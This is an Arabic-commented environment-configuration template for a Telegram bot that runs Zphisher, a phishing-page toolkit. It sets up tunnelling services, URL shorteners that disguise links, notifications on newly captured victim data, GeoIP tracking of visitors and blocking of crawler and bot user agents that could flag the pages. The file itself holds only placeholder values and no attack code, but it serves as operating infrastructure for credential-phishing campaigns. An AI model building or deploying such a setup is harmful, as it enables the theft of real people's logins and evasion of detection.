# 🤖 إعدادات بوت Zphisher Telegram المتقدم
# انسخ هذا الملف إلى .env وقم بتعديل القيم

# ═══════════════════════════════════════════════════════════════════
# 🔑 إعدادات البوت الأساسية
# ═══════════════════════════════════════════════════════════════════

# رمز البوت من BotFather
BOT_TOKEN=1234567890:AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

# معرف المدير الأساسي (Super Admin)
SUPER_ADMIN_ID=123456789

# قائمة معرفات المدراء الإضافيين (مفصولة بفواصل)
ADMIN_IDS=987654321,456789123

# ═══════════════════════════════════════════════════════════════════
# 🗄️ إعدادات قاعدة البيانات
# ═══════════════════════════════════════════════════════════════════

# رابط قاعدة البيانات
DATABASE_URL=sqlite+aiosqlite:///./zphisher_bot.db

# عدد الاتصالات المتزامنة
DATABASE_POOL_SIZE=20

# مهلة الاتصال (بالثواني)
DATABASE_TIMEOUT=30

# ═══════════════════════════════════════════════════════════════════
# 🔒 إعدادات الأمان والتشفير
# ═══════════════════════════════════════════════════════════════════

# مفتاح سري عام للبوت (32 حرف)
SECRET_KEY=your_super_secret_key_32_chars_long

# مفتاح JWT للجلسات (32 حرف)
JWT_SECRET=another_super_secret_jwt_key_32_chars

# مفتاح التشفير Fernet (44 حرف base64)
ENCRYPTION_KEY=your_fernet_encryption_key_44_chars_base64_encoded

# مدة انتهاء صلاحية JWT (بالساعات)
JWT_EXPIRATION_HOURS=24

# مدة انتهاء الجلسات (بالساعات)
SESSION_TIMEOUT_HOURS=168

# ═══════════════════════════════════════════════════════════════════
# 📁 مسارات النظام
# ═══════════════════════════════════════════════════════════════════

# مسار مجلد Zphisher
ZPHISHER_PATH=/path/to/zphisher

# مسار أداة Cloudflared
CLOUDFLARED_PATH=/usr/local/bin/cloudflared

# مسار أداة LocalXpose
LOCALXPOSE_PATH=/usr/local/bin/loclx

# مسار أداة Ngrok
NGROK_PATH=/usr/local/bin/ngrok

# مجلد حفظ الملفات
UPLOAD_DIR=./uploads

# مجلد البيانات المؤقتة
TEMP_DIR=./temp

# مجلد النسخ الاحتياطية
BACKUP_DIR=./backups

# ═══════════════════════════════════════════════════════════════════
# 📊 إعدادات السجلات
# ═══════════════════════════════════════════════════════════════════

# مستوى السجل (DEBUG, INFO, WARNING, ERROR, CRITICAL)
LOG_LEVEL=INFO

# ملف السجل الرئيسي
LOG_FILE=./logs/bot.log

# حجم ملف السجل الأقصى (بالميجابايت)
LOG_MAX_SIZE=10

# عدد ملفات النسخ الاحتياطية للسجلات
LOG_BACKUP_COUNT=5

# تنسيق السجلات
LOG_FORMAT=%(asctime)s - %(name)s - %(levelname)s - %(message)s

# ═══════════════════════════════════════════════════════════════════
# 🌐 إعدادات الشبكة والويب
# ═══════════════════════════════════════════════════════════════════

# نطاق الويب الأساسي
BASE_DOMAIN=yourdomain.com

# بروتوكول الويب (http أو https)
WEB_PROTOCOL=https

# منفذ خادم PHP الافتراضي
DEFAULT_PHP_PORT=8080

# نطاق منافذ PHP المسموحة
PHP_PORT_RANGE_START=8080
PHP_PORT_RANGE_END=8999

# مهلة انتظار الاتصالات (بالثواني)
REQUEST_TIMEOUT=30

# عدد المحاولات القصوى للاتصال
MAX_RETRIES=3

# ═══════════════════════════════════════════════════════════════════
# 🔗 إعدادات اختصار الروابط
# ═══════════════════════════════════════════════════════════════════

# خدمة اختصار الروابط (tinyurl, bitly, shortio, cuttly, rebrandly)
URL_SHORTENER=tinyurl

# مفتاح API لـ Bit.ly
BITLY_ACCESS_TOKEN=your_bitly_access_token

# مفتاح API لـ Short.io
SHORTIO_DOMAIN=your_shortio_domain
SHORTIO_API_KEY=your_shortio_api_key

# مفتاح API لـ Cutt.ly
CUTTLY_API_KEY=your_cuttly_api_key

# مفتاح API لـ Rebrandly
REBRANDLY_API_KEY=your_rebrandly_api_key
REBRANDLY_DOMAIN=yourdomain.link

# ═══════════════════════════════════════════════════════════════════
# 📧 إعدادات الإشعارات
# ═══════════════════════════════════════════════════════════════════

# تفعيل الإشعارات
NOTIFICATIONS_ENABLED=true

# إشعارات البيانات الجديدة
NOTIFY_NEW_CAPTURES=true

# إشعارات الجلسات الجديدة
NOTIFY_NEW_SESSIONS=true

# إشعارات الأخطاء
NOTIFY_ERRORS=true

# إشعارات المدراء فقط
ADMIN_ONLY_NOTIFICATIONS=false

# قناة الإشعارات (معرف القناة أو المجموعة)
NOTIFICATIONS_CHANNEL=-1001234567890

# ═══════════════════════════════════════════════════════════════════
# ⚡ إعدادات الأداء والحدود
# ═══════════════════════════════════════════════════════════════════

# عدد الجلسات القصوى لكل مستخدم
MAX_SESSIONS_PER_USER=5

# عدد البيانات القصوى لكل جلسة
MAX_CAPTURES_PER_SESSION=1000

# حد الطلبات في الدقيقة (Rate Limiting)
RATE_LIMIT_PER_MINUTE=20

# حد الطلبات في الساعة
RATE_LIMIT_PER_HOUR=500

# مهلة انتظار الجلسة غير النشطة (بالدقائق)
SESSION_IDLE_TIMEOUT=60

# تنظيف تلقائي للبيانات القديمة (بالأيام)
AUTO_CLEANUP_DAYS=30

# ═══════════════════════════════════════════════════════════════════
# 🔧 إعدادات التطوير والاختبار
# ═══════════════════════════════════════════════════════════════════

# وضع التطوير (true/false)
DEBUG_MODE=false

# تشغيل البوت محلياً (polling) أم عبر webhook
USE_WEBHOOK=false

# رابط Webhook (إذا كان USE_WEBHOOK=true)
WEBHOOK_URL=https://yourdomain.com/webhook

# منفذ Webhook
WEBHOOK_PORT=8443

# مسار Webhook
WEBHOOK_PATH=/bot_webhook

# مفتاح SSL (إذا كان USE_WEBHOOK=true)
WEBHOOK_SSL_CERT=./ssl/cert.pem
WEBHOOK_SSL_PRIV=./ssl/private.key

# ═══════════════════════════════════════════════════════════════════
# 📱 إعدادات واجهة المستخدم
# ═══════════════════════════════════════════════════════════════════

# اللغة الافتراضية (ar, en)
DEFAULT_LANGUAGE=ar

# المنطقة الزمنية الافتراضية
DEFAULT_TIMEZONE=Asia/Riyadh

# عدد العناصر في الصفحة الواحدة
ITEMS_PER_PAGE=10

# مهلة انتظار استجابة المستخدم (بالثواني)
USER_INPUT_TIMEOUT=300

# ═══════════════════════════════════════════════════════════════════
# 🌍 إعدادات GeoIP والتحليل
# ═══════════════════════════════════════════════════════════════════

# تفعيل تحليل GeoIP
GEOIP_ENABLED=true

# مسار قاعدة بيانات GeoIP
GEOIP_DATABASE_PATH=./data/GeoLite2-City.mmdb

# تحديث قاعدة بيانات GeoIP تلقائياً
GEOIP_AUTO_UPDATE=true

# مفتاح API لـ MaxMind GeoIP
MAXMIND_LICENSE_KEY=your_maxmind_license_key

# ═══════════════════════════════════════════════════════════════════
# 📈 إعدادات التحليل والإحصائيات
# ═══════════════════════════════════════════════════════════════════

# تفعيل التحليل المتقدم
ANALYTICS_ENABLED=true

# حفظ إحصائيات مفصلة
DETAILED_STATS=true

# تحليل سلوك المستخدمين
USER_BEHAVIOR_ANALYSIS=true

# مدة حفظ الإحصائيات (بالأيام)
STATS_RETENTION_DAYS=365

# ═══════════════════════════════════════════════════════════════════
# 🔄 إعدادات النسخ الاحتياطي
# ═══════════════════════════════════════════════════════════════════

# تفعيل النسخ الاحتياطي التلقائي
AUTO_BACKUP_ENABLED=true

# تكرار النسخ الاحتياطي (daily, weekly, monthly)
BACKUP_FREQUENCY=daily

# وقت النسخ الاحتياطي (HH:MM بتوقيت 24 ساعة)
BACKUP_TIME=03:00

# عدد النسخ الاحتياطية المحفوظة
BACKUP_KEEP_COUNT=30

# ضغط النسخ الاحتياطية
BACKUP_COMPRESSION=true

# ═══════════════════════════════════════════════════════════════════
# ☁️ إعدادات التخزين السحابي (اختياري)
# ═══════════════════════════════════════════════════════════════════

# نوع التخزين السحابي (local, s3, drive, dropbox)
CLOUD_STORAGE_TYPE=local

# إعدادات Amazon S3
AWS_ACCESS_KEY_ID=your_aws_access_key
AWS_SECRET_ACCESS_KEY=your_aws_secret_key
AWS_BUCKET_NAME=your_s3_bucket
AWS_REGION=us-east-1

# إعدادات Google Drive
GOOGLE_DRIVE_CREDENTIALS_FILE=./credentials/google_drive.json

# إعدادات Dropbox
DROPBOX_ACCESS_TOKEN=your_dropbox_access_token

# ═══════════════════════════════════════════════════════════════════
# 🔍 إعدادات المراقبة والتنبيهات
# ═══════════════════════════════════════════════════════════════════

# تفعيل مراقبة النظام
SYSTEM_MONITORING=true

# تنبيهات استخدام المعالج (%)
CPU_ALERT_THRESHOLD=80

# تنبيهات استخدام الذاكرة (%)
MEMORY_ALERT_THRESHOLD=85

# تنبيهات مساحة القرص (%)
DISK_ALERT_THRESHOLD=90

# تنبيهات الشبكة
NETWORK_MONITORING=true

# مراقبة قاعدة البيانات
DATABASE_MONITORING=true

# ═══════════════════════════════════════════════════════════════════
# 🛡️ إعدادات الحماية المتقدمة
# ═══════════════════════════════════════════════════════════════════

# تفعيل الحماية من DDoS
DDOS_PROTECTION=true

# تفعيل الحماية من البوتات
BOT_PROTECTION=true

# تفعيل التحقق من User Agent
USER_AGENT_VALIDATION=true

# قائمة User Agents المحظورة (مفصولة بفواصل)
BLOCKED_USER_AGENTS=bot,crawler,spider

# قائمة دول محظورة (أكواد ISO مفصولة بفواصل)
BLOCKED_COUNTRIES=

# تفعيل القائمة البيضاء للدول
COUNTRY_WHITELIST_ENABLED=false

# قائمة الدول المسموحة
ALLOWED_COUNTRIES=

# ═══════════════════════════════════════════════════════════════════
# 📊 إعدادات التقارير
# ═══════════════════════════════════════════════════════════════════

# تفعيل التقارير التلقائية
AUTO_REPORTS=true

# تكرار التقارير (daily, weekly, monthly)
REPORT_FREQUENCY=weekly

# يوم إرسال التقرير الأسبوعي (0-6, 0=الأحد)
WEEKLY_REPORT_DAY=0

# يوم إرسال التقرير الشهري (1-31)
MONTHLY_REPORT_DAY=1

# تنسيق التقارير (text, html, pdf)
REPORT_FORMAT=html

# إرسال التقارير للمدراء
SEND_REPORTS_TO_ADMINS=true